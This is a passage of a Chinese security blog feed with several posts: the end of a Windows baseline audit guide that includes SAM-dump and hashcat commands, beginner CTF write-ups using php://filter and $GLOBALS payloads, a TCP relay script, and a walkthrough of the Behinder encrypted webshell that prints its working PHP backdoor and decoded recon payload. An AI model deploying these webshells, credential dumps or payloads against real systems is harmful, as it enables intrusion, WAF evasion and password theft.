class="headerlink" title="注册表信息"></a>注册表信息</h2><p>是否开启屏保（0关，1开）</p><pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive |find &quot;ScreenSaveActive&quot;</code></pre><p>屏保时间（单位秒）</p><pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveTimeOut |find &quot;ScreenSaveTimeOut&quot;</code></pre><p>屏保恢复时使用密码保护（0否，1是）</p><pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaverIsSecure |find &quot;ScreenSaverIsSecure&quot;</code></pre><p>防火墙状态（1开，0关）</p><pre><code>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall |find &quot;EnableFirewall&quot;</code></pre><p>远程桌面(0开，1关)</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections |find &quot;fDenyTSConnections&quot;</code></pre><p>3389端口(d3d:3389)</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber |find &quot;PortNumber&quot;</code></pre><p>远程协助(0关（合规），1开</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Remote Assistance&quot; /v fAllowToGetHelp |find &quot;fAllowToGetHelp&quot;</code></pre><p>应用日志文件大小（0x2800000以上为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application&quot; /v MaxSize |find &quot;MaxSize&quot;</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application&quot; /v Retention |find &quot;Retention&quot;</code></pre><p>安全日志文件大小（0x2800000以上为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Security&quot; /v MaxSize |find &quot;MaxSize&quot;</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Security&quot; /v Retention |find &quot;Retention&quot;</code></pre><p>系统日志文件大小（0x2800000以上为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\System&quot; /v MaxSize |find &quot;MaxSize&quot;</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\System&quot; /v Retention |find &quot;Retention&quot;</code></pre><p>分区共享（存在且为0，为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&quot; /v AutoShareServer |find &quot;AutoShareServer&quot;</code></pre><p>ADMIN共享（存在且为0，为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&quot; /v AutoShareWks |find &quot;AutoShareWks&quot;</code></pre><p>IPC共享（存在且为1，为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v restrictanonymous |find &quot;restrictanonymous&quot;</code></pre><p>共享列表</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\lanmanserver\shares&quot;</code></pre><p>软件列表</p><pre><code>reg query HKLM\SOFTWARE</code></pre><h2 id="共享信息"><a href="#共享信息" class="headerlink" title="共享信息"></a>共享信息</h2><p>默认共享</p><pre><code>net share</code></pre><h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><p>系统服务</p><pre><code>net start</code></pre><p>系统进程</p><pre><code>tasklist</code></pre><p>系统信息</p><pre><code>systeminfo</code></pre><h2 id="口令检测"><a href="#口令检测" class="headerlink" title="口令检测"></a>口令检测</h2><p>导出SAM</p><pre><code>reg save hklm\sam %IPaddress%.samreg save hklm\system %IPaddress%.system</code></pre><h2 id="更新日志检测"><a href="#更新日志检测" class="headerlink" title="更新日志检测"></a>更新日志检测</h2><p>在更新日志中查看最后更新日期</p><pre><code>C:\Windows\WindowsUpdate.log</code></pre><h2 id="分析脚本编写"><a href="#分析脚本编写" class="headerlink" title="分析脚本编写"></a>分析脚本编写</h2><h3 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h3><p>CMD5</p><p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></p><p>Ophcrack</p><p><a href="https://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack.php</a></p><p>hashcat</p><pre><code>hashcat64.exe -m 1000 -a 0 Winhash.txt pass.txt hashcat64.exe -m 1000 -a 0 Winhash.txt pass.txt --show</code></pre><h1 id="反病毒测试"><a href="#反病毒测试" class="headerlink" title="反病毒测试"></a>反病毒测试</h1><p><a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a></p><p><a href="http://r.virscan.org/" target="_blank" rel="noopener">http://r.virscan.org/</a></p><p><a href="https://s.threatbook.cn/" target="_blank" rel="noopener">https://s.threatbook.cn/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;操作系统安全基线&quot;&gt;&lt;a href=&quot;#操作系统安全基线&quot; class=&quot;headerlink&quot; title=&quot;操作系统安全基线&quot;&gt;&lt;/a&gt;操作系统安全基线&lt;/h1&gt;&lt;p&gt;服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。&lt;/p&gt;
&lt;h2 id
      
    
    </summary>
    
      <category term="windows" scheme="http://yoursite.com/categories/windows/"/>
    
    
  </entry>
  
  <entry>
    <title>入门CTF</title>
    <link href="http://yoursite.com/2018/12/18/%E5%85%A5%E9%97%A8CTF/"/>
    <id>http://yoursite.com/2018/12/18/入门CTF/</id>
    <published>2018-12-18T01:52:49.000Z</published>
    <updated>2018-12-18T03:47:02.173Z</updated>
    
    <content type="html"><![CDATA[<p>头次尝试CTF20多题，有些脑洞和方法不会的，在这里记录一下，相信会越来越好。</p><p>网站是：</p><p><a href="https://ctf.bugku.com" target="_blank" rel="noopener">https://ctf.bugku.com</a></p><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag</p><p>方法：</p><p>直接在 <code>c:\windows\system32\drivers\etc\hosts</code>打开进行修改，在最后添加上我们需要的 </p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyao09x3f5j30kp09yt8z.jpg" alt=""></p><p>然后游览器访问flag.baidu.com即可拿到flag</p><h1 id="变量一"><a href="#变量一" class="headerlink" title="变量一"></a>变量一</h1><p>源码：</p><pre><code>flag In the variable ! &lt;?php  error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&apos;args&apos;])){    $args = $_GET[&apos;args&apos;];    if(!preg_match(&quot;/^\w+$/&quot;,$args)){        die(&quot;args error!&quot;);    }    eval(&quot;var_dump($$args);&quot;);}?&gt;</code></pre><p>从代码可以看出，这应该是个eval处存在代码注入，$$args可能存在变量覆盖，但是没有想出来如何解决，上网查之。</p><p>PHP超全局变量：$GLOBALS—-引用全局作用域中可用的全部变量。用于在 PHP 脚本中的任意位置访问全局变量</p><p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>构造URL：<a href="http://123.206.87.240:8004/index1.php?args=GLOBALS" target="_blank" rel="noopener">http://123.206.87.240:8004/index1.php?args=GLOBALS</a></p><p>打印出全部的全局变量，找到flag</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyaokei3ihj30q90ab74o.jpg" alt=""></p><h1 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h1><p>JSPFUCK??????答案格式CTF{**}</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyaoq3590aj308w04rt8j.jpg" alt=""></p><p>F12看到里面的div标签下有一大串非常长的东西。</p><p>把那一大长串放到google的console中，运行出结果得到flag。（别忘了大写）</p><h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p>先入为主了，没往实战上想，实在惭愧，脑子转不过来= -。看了一下网上的解答，恍然大悟</p><p>先扫后台，扫出了shell.php</p><p>然后burp抓包爆破得到flag</p><p> <code>flag{hack_bug_ku035}</code></p><h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><p>查源码，无果，抓包，无果。</p><p>构造<a href="http://123.206.87.240:8005/post/index.php?file=index.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=index.php</a>无果。</p><p>知道这里应该有关文件包含，但是苦于无法利用。</p><p>上网查询得file传值为：<code>php://filter/read=convert.base64-encode/resource=index.php</code></p><p>然后base64解密得到的值就可以得到flag</p><p><strong><code>php://filter</code>协议有一下几个应用：</strong></p><ul><li><p>1、利用base64获得源码</p></li><li><p>2、通过读写编码实行绕过操作</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;头次尝试CTF20多题，有些脑洞和方法不会的，在这里记录一下，相信会越来越好。&lt;/p&gt;
&lt;p&gt;网站是：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf.bugku.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf.bug
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>rtcp.py</title>
    <link href="http://yoursite.com/2018/12/17/rtcp-py/"/>
    <id>http://yoursite.com/2018/12/17/rtcp-py/</id>
    <published>2018-12-17T12:15:04.000Z</published>
    <updated>2018-12-17T12:15:35.665Z</updated>
    
    <content type="html"><![CDATA[<pre><code>import socketimport sysimport threadingimport timestreams = [None, None]  # 存放需要进行数据转发的两个数据流（都是 SocketObj 对象）debug = 1  # 调试状态 0 or 1def _usage():    print(&apos;Usage: ./rtcp.py stream1 stream2\nstream: l:port  or c:host:port&apos;)def _get_another_stream(num):    &quot;&quot;&quot;    从streams获取另外一个流对象，如果当前为空，则等待    &quot;&quot;&quot;    if num == 0:        num = 1    elif num == 1:        num = 0    else:        raise NameError(&apos;error&apos;)    while True:        if streams[num] == &apos;quit&apos;:            print(&apos;can not connect to the target, quit now!&apos;)            sys.exit(1)        if streams[num] is not None:            return streams[num]        else:            time.sleep(1)def _xstream(num, s1, s2):    &quot;&quot;&quot;    交换两个流的数据    num为当前流编号,主要用于调试目的，区分两个回路状态用。    &quot;&quot;&quot;    try:        while True:            # 注意，recv 函数会阻塞，直到对端完全关闭（close 后还需要一定时间才能关闭，最快关闭方法是 shutdow）            buff = s1.recv(1024)            if debug &gt; 0:                print(&apos;%d recv&apos; % num)            if len(buff) == 0:  # 对端关闭连接，读不到数据                print(&apos;%d one closed&apos; % num)                break            s2.sendall(buff)            if debug &gt; 0:                print(&apos;%d sendall&apos; % num)    except:        print(&apos;%d one connect closed.&apos; % num)    try:        s1.shutdown(socket.SHUT_RDWR)        s1.close()    except:        pass    try:        s2.shutdown(socket.SHUT_RDWR)        s2.close()    except:        pass    streams[0] = None    streams[1] = None    print(&apos;%d CLOSED&apos; % num)def _server(port, num):    &quot;&quot;&quot;    处理服务情况，num 为流编号（第 0 号还是第 1 号）    &quot;&quot;&quot;    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    # 绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。    srv.bind((&apos;0.0.0.0&apos;, port))    # 开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。    srv.listen(1)    while True:        # 被动接受TCP客户端连接,(阻塞式)等待连接的到来        conn, addr = srv.accept()        print(&apos;connected from: %s&apos; % str(addr))        streams[num] = conn  # 放入本端流对象        # 获取另一端流对象        s2 = _get_another_stream(num)        _xstream(num, conn, s2)def _connect(host, port, num):    &quot;&quot;&quot;处理连接，num 为流编号（第 0 号还是第 1 号）    @note: 如果连接不到远程，会 sleep 36s，最多尝试 200（即两小时）    &quot;&quot;&quot;    not_connet_time = 0    wait_time = 36    try_cnt = 199    while True:        if not_connet_time &gt; try_cnt:            streams[num] = &apos;quit&apos;            print(&apos;not connected&apos;)            return None        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        try:            conn.connect((host, port))        except Exception:            print(&apos;can not connect %s:%s!&apos; % (host, port))            not_connet_time += 1            time.sleep(wait_time)            continue        print(&apos;connected to %s:%i&apos; % (host, port))        streams[num] = conn  # 放入本端流对象        s2 = _get_another_stream(num)  # 获取另一端流对象        _xstream(num, conn, s2)def main():    # if len(sys.argv) != 3:    #     _usage()    #     sys.exit(1)    tlist = []  # 线程列表，最终存放两个线程对象    # targv = [sys.argv[1], sys.argv[2]]    targv = [&quot;l:4567&quot;, &quot;c:127.0.0.1:80&quot;]    for i in [0, 1]:        s = targv[i]  # stream 描述 c:ip:port 或 l:port        sl = s.split(&apos;:&apos;)        if len(sl) == 2 and (sl[0] == &apos;l&apos; or sl[0] == &apos;L&apos;):  # l:port            t = threading.Thread(target=_server, args=(int(sl[1]), i))            tlist.append(t)        elif len(sl) == 3 and (sl[0] == &apos;c&apos; or sl[0] == &apos;C&apos;):  # c:host:port            t = threading.Thread(target=_connect, args=(sl[1], int(sl[2]), i))            tlist.append(t)        else:            _usage()            sys.exit(1)    for t in tlist:        t.start()    for t in tlist:        t.join()    sys.exit(0)if __name__ == &apos;__main__&apos;:    main()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;import socket
import sys
import threading
import time
streams = [None, None]  # 存放需要进行数据转发的两个数据流（都是 SocketObj 对象）
debug = 1  # 调试
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>动态二进制加密实现一句话木马（冰蝎）</title>
    <link href="http://yoursite.com/2018/12/17/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E5%AE%9E%E7%8E%B0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%88%E5%86%B0%E8%9D%8E%EF%BC%89/"/>
    <id>http://yoursite.com/2018/12/17/动态二进制加密实现一句话木马（冰蝎）/</id>
    <published>2018-12-17T03:19:44.000Z</published>
    <updated>2018-12-17T07:43:42.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一句话木马从最早的<code>&lt;?php @eval($_POST[cmd]);?&gt;</code>到现在，也有很长时间的历史了。客户端工具也从最简单的一个html页面发展到现在的各种GUI工具。但是近些年友军也没闲着，涌现出了各种防护系统，这些防护系统主要分为两类：一类是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测；另一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测，目前绝大多数商业级的防护设备皆属于此种类型。一旦目标网络部署了基于网络的防护设备，我们常用的一句话木马客户端在向服务器发送Payload时就会被拦截，这也就导致了有些场景下会出现一句话虽然已经成功上传，但是却无法连接的情况。</p><h1 id="为什么被拦截"><a href="#为什么被拦截" class="headerlink" title="为什么被拦截"></a>为什么被拦截</h1><p>虽然有时候会采用base64编码，但是payload任有特征字符如eval等，参数值有base64编码等等。<br>对方的规则也在不断的更新，不断识别关键的编码函数名称、加解密函数名称，并加入到规则里面。于是攻击者和防御者展开了长期的较量，不停的变换着各种姿势。</p><h1 id="为啥防御者可以不停的更新规则"><a href="#为啥防御者可以不停的更新规则" class="headerlink" title="为啥防御者可以不停的更新规则"></a>为啥防御者可以不停的更新规则</h1><p>主要有两个原因：</p><ul><li><p>攻击者发送的请求都是脚本源代码，无论怎么样编码，仍然是服务器端解析引擎可以解析的源代码，是基于文本的，防御者能看懂。</p></li><li><p>攻击者执行多次相同的操作，发送的请求数据也是相同的，防御者就可以把他看懂的请求找出特征固化为规则。</p></li></ul><p>但是如果攻击者的请求不是文本格式的源代码而是编译之后的的字节码，字节码是一堆二进制数据流，不存在参数，攻击者把二进制字节码进行加密，防御者看到的就是一堆加了密的二进制数据流，攻击者多次执行同样的操作采用不同的密钥加密，即使是同样的payload，防御者看到的请求数据也不一样，这就使防御者无法通过流量分析来提取规则。</p><h1 id="一劳永逸的绕过"><a href="#一劳永逸的绕过" class="headerlink" title="一劳永逸的绕过"></a>一劳永逸的绕过</h1><h2 id="具体流程："><a href="#具体流程：" class="headerlink" title="具体流程："></a>具体流程：</h2><ul><li>首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器的Session中。</li><li>客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。</li><li>服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。</li><li>服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。</li><li>客户端解密服务器端返回的结果。</li></ul><h2 id="执行流程图："><a href="#执行流程图：" class="headerlink" title="执行流程图："></a>执行流程图：</h2><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy9ksdk3ufj30f60ejdgl.jpg" alt=""></p><h1 id="服务端实现"><a href="#服务端实现" class="headerlink" title="服务端实现"></a>服务端实现</h1><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p><p>代码：</p><pre><code>&lt;?phpsession_start();if (isset($_GET[&apos;pass&apos;])){    #uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。    $key=substr(md5(uniqid(rand())),16);    $_SESSION[&apos;k&apos;]=$key;    print $key;}else{    $key=$_SESSION[&apos;k&apos;];    #参数为解密密文、解密方法、解密密钥    #php://input 去获取请求体中的信息（请求类型为multipart/form-data 时 失效不会封装 数据为空）封装起来返回给程序 无法获取get信息 因为GET的信息附加到URL里 不在请求体中    $decrptContent=openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $key);    $arr=explode(&apos;|&apos;,$decrptContent);    $func=$arr[0];    $params=$arr[1];    $func($params);}?&gt;</code></pre><p>流程：</p><ul><li>首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。</li><li>客户端将源代码，如<code>assert|eval(&quot;phpinfo();”)</code>利用AES加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串<code>assert|eval(&quot;phpinfo();&quot;)。</code></li><li>服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串<code>eval(&quot;phpinfo();&quot;)</code>。</li><li>以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为<code>assert(&quot;eval(\&quot;phpinfo;\&quot;)&quot;)</code> 。</li></ul><p>再具体一点，比如客户端有一段代码</p><pre><code>assert|eval(&quot;phpinfo();&quot;)</code></pre><p>进行AES128加密发送给服务端，服务端用explode函数分割字符，索引为0的是assert，索引为1的<code>eval(&quot;phpinfo();&quot;)</code>，然后通过可变函数执行<code>assert(&quot;eval(\&quot;phpinfo();\&quot;)&quot;)</code>。</p><h1 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h1><p>通过作者提供的客户端，拿到：</p><pre><code>assert|eval(base64_decode(&apos;ZXJyb3JfcmVwb3J0aW5nKDApOw0KZnVuY3Rpb24gbWFpbigpIHsNCiAgICBvYl9zdGFydCgpOyBwaHBpbmZvKCk7ICRpbmZvID0gb2JfZ2V0X2NvbnRlbnRzKCk7IG9iX2VuZF9jbGVhbigpOw0KICAgICRkcml2ZUxpc3QgPSIiOw0KICAgIGlmIChzdHJpc3RyKFBIUF9PUywid2luZG93cyIpfHxzdHJpc3RyKFBIUF9PUywid2lubnQiKSkNCiAgICB7DQogICAgICAgIGZvcigkaT02NTskaTw9OTA7JGkrKykNCiAgICAJew0KICAgIAkJJGRyaXZlPWNocigkaSkuJzovJzsNCiAgICAJCWZpbGVfZXhpc3RzKCRkcml2ZSkgPyAkZHJpdmVMaXN0PSRkcml2ZUxpc3QuJGRyaXZlLiI7IjonJzsNCiAgICAJfQ0KICAgIH0NCgllbHNlDQoJew0KCQkkZHJpdmVMaXN0PSIvIjsNCgl9DQogICAgJGN1cnJlbnRQYXRoPWdldGN3ZCgpOw0KICAgIC8vZWNobyAicGhwaW5mbz0iLiRpbmZvLiJcbiIuImN1cnJlbnRQYXRoPSIuJGN1cnJlbnRQYXRoLiJcbiIuImRyaXZlTGlzdD0iLiRkcml2ZUxpc3Q7DQogICAgJG9zSW5mbz1QSFBfT1M7DQogICAgJHJlc3VsdD1hcnJheSgiYmFzaWNJbmZvIj0+YmFzZTY0X2VuY29kZSgkaW5mbyksImRyaXZlTGlzdCI9PmJhc2U2NF9lbmNvZGUoJGRyaXZlTGlzdCksImN1cnJlbnRQYXRoIj0+YmFzZTY0X2VuY29kZSgkY3VycmVudFBhdGgpLCJvc0luZm8iPT5iYXNlNjRfZW5jb2RlKCRvc0luZm8pKTsNCiAgICAvL2VjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7DQogICAgc2Vzc2lvbl9zdGFydCgpOw0KICAgICRrZXk9JF9TRVNTSU9OWydrJ107DQogICAgLy9lY2hvIGpzb25fZW5jb2RlKCRyZXN1bHQpOw0KICAgIGVjaG8gb3BlbnNzbF9lbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAiQUVTMTI4IiwgJGtleSk7DQp9DQptYWluKCk7&apos;));</code></pre><p>经过base64解码得：</p><pre><code>error_reporting(0);function main() {    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();    $driveList =&quot;&quot;;    if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;))    {        for($i=65;$i&lt;=90;$i++)        {            $drive=chr($i).&apos;:/&apos;;            file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;;        }    }    else    {        $driveList=&quot;/&quot;;    }    $currentPath=getcwd();    //echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList;    $osInfo=PHP_OS;    $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo));    //echo json_encode($result);    session_start();    $key=$_SESSION[&apos;k&apos;];    //echo json_encode($result);    echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);}main();</code></pre><p>可以看出这段代码主要做了这些工作：</p><p>保存phpinfo内容</p><pre><code>ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();</code></pre><blockquote><p><code>ob_start()</code>把输出内容输出到缓冲区而不是游览器，然后用<code>ob_get_contents</code>得到缓冲区数据，最后用<code>ob_end_clean</code>清除缓冲区</p></blockquote><p>服务端有哪些盘符</p><pre><code>$driveList =&quot;&quot;;   if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;))   {       for($i=65;$i&lt;=90;$i++)       {           $drive=chr($i).&apos;:/&apos;;           file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;;       }   }   else   {       $driveList=&quot;/&quot;;   }</code></pre><p>获取当前路径</p><pre><code>$currentPath=getcwd();</code></pre><p>以及检查php运行环境。</p><pre><code>$osInfo=PHP_OS;</code></pre><p>然后对这些信息进行base64编码，再用json编码，再用key进行”AES128”加密。</p><pre><code>$result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo));//echo json_encode($result);session_start();$key=$_SESSION[&apos;k&apos;];//echo json_encode($result);echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);</code></pre><p>借鉴自：<a href="http://halazi.xin/2018/12/11/Behinder/" target="_blank" rel="noopener">http://halazi.xin/2018/12/11/Behinder/</a></p><p><a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">https://xz.aliyun.com/t/2744</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一句话木马从最早的&lt;code&gt;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&lt;/code&gt;到现在，也有很长时间的历史了。
      
    
    </summary>
    
      <category term="加密解密" scheme="http://yoursite.com/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux账户安全机制</title>
    <link href="http://yoursite.com/2018/12/13/Linux%E8%B4%A6%E6%88%B7%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    <id>http://yoursite.com/2018/12/13/Linux账户安全机制/</id>
    <published>2018-12-13T02:43:18.000Z</published>
    <updated>2018-12-13T03:01:14.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统标识与鉴别-安全主体"><a href="#Linux系统标识与鉴别-安全主体" class="headerlink" title="Linux系统标识与鉴别-安全主体"></a>Linux系统标识与鉴别-安全主体</h1><h2 id="安全主体"><a href="#安全主体" class="headerlink" title="安全主体"></a>安全主体</h2><ul><li>用户：身份标识（UserID）</li><li>组：身份标识（Group ID）</li></ul><h2 id="用户与组基本概念"><a href="#用户与组基本概念" class="headerlink" title="用户与组基本概念"></a>用户与组基本概念</h2><ul><li>文件必须有所有者</li><li>用户必须属于某个或多个组</li><li>用户与组的关系灵活（一对多、多对多等都可以）</li><li>根用户拥有所有权限</li></ul><h1 id="Linux系统标识与鉴别-帐号信息存储"><a href="#Linux系统标识与鉴别-帐号信息存储" class="headerlink" title="Linux系统标识与鉴别-帐号信息存储"></a>Linux系统标识与鉴别-帐号信息存储</h1><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><pre><code>/etc/passwd/etc/shadow</code></pre><h3 id="组信息"><a href="#组信息" class="headerlink" title="组信息"></a>组信息</h3><pre><code>/etc/group/etc/gshadow</code></pre><p>在Linux中系统中，并不认识<strong>帐号名称</strong>，认识的是<strong>帐号ID</strong>，帐号ID保存在<code>/etc/passwd</code>文件中</p><p>在登录Linux主机时，在输入完帐号和密码时，Linux会先查找<code>/etc/passwd</code>文件中是否有这个帐号，如果没有则跳出，如果有的话，他会读取该帐号的user ID和group ID同时该帐号的根目录和shell也读了出来</p><h3 id="etc-passwd中的信息"><a href="#etc-passwd中的信息" class="headerlink" title="/etc/passwd中的信息"></a><code>/etc/passwd</code>中的信息</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy4xpgsw5dj30fq08mjxj.jpg" alt=""></p><p>一共有七项，每一项使用：分开，他们代表的意思如下：</p><p>（1）帐号名称：帐号名称由于对应用户ID，这个是系统默认用户root超级管理员，在同一个系统帐号名称是唯一的。</p><p>（2）密码：由于系统中/etc/shadow文件用于存放加密后的口令，所以在这里这一项是“x”来表示，如果用户没有设置口令，则该项为空。</p><p>（3）用户lD：不同的用户识别码不同，其中用户ID有以下几种：<br>0代表系统管理员（如果建立一个系统管理员，可以建立一个普通帐户，然后将该账户的用户1D改为0即可）。<br>1-500系统预留的1D，500以上是普通用户使用。</p><p>（4）组ID：用来规范群组，他与<code>/etc/group</code>有关。</p><p>（5）描述信息：这个字段几乎没有什么作用，只是用来解释这个帐号的意义。</p><p>（6）用户根目录：就是用户登录系统的起始目录，用户登录系统后将首先进入该目录。root用户默认的是<code>/root</code>，普通用户的是<code>/home</code>/用户名。</p><p>（7）用户登录shell：就是用户登录系统时使用的shell。</p><h3 id="etc-shadow中的信息"><a href="#etc-shadow中的信息" class="headerlink" title="/etc/shadow中的信息"></a><code>/etc/shadow</code>中的信息</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy4xpvryghj30ka0aq10y.jpg" 